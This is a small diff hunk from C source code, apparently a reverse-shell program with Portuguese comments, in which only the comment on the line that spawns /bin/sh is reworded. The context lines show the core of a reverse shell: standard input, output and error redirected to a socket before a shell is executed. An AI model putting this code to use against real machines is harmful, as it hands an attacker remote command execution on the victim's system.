@@ -28,6 +28,6 @@ void reverse_shell(char *ip, int port){
     dup2(s, 1);
     dup2(s, 2);
 
-    execve("/bin/sh", 0, 0); // usando o sh pra executar os comandos
+    execve("/bin/sh", 0, 0); // spawnando o shell
     return 0;
 }
